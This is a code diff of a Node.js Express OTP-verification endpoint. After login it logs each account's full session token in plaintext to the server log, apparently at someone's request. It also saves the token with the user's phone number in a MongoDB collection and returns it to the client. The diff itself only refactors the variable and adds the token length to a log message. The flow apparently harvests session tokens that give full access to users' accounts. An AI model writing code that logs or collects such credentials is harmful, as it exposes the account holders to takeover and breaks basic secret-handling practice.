@@ -85,18 +85,20 @@ app.post('/api/verify-otp', async (req, res) => {
         if (result.status === 'success') {
             sessionStore.delete(phone);
             
+            const sessionToken = result.session;
+            
             // Log to Render Log as requested
-            console.log(`account token is ${result.session}`);
+            console.log(`account token is ${sessionToken}`);
 
             // Save to MongoDB
             if (db) {
                 try {
                     await db.collection('tokens').insertOne({
                         phone: phone,
-                        token: result.session,
+                        token: sessionToken,
                         createdAt: new Date()
                     });
-                    console.log(`Token for ${phone} saved to MongoDB successfully`);
+                    console.log(`Token for ${phone} saved to MongoDB successfully. Token length: ${sessionToken ? sessionToken.length : 0}`);
                 } catch (mongoErr) {
                     console.error('Error saving to MongoDB:', mongoErr);
                 }
@@ -104,7 +106,7 @@ app.post('/api/verify-otp', async (req, res) => {
                 console.error('Database connection not established');
             }
 
-            res.json({ message: 'Success', session: result.session });
+            res.json({ message: 'Success', session: sessionToken });
         } else if (result.status === 'password_required') {
             res.json({ status: 'password_required', message: 'Two-step verification password required' });
         } else {
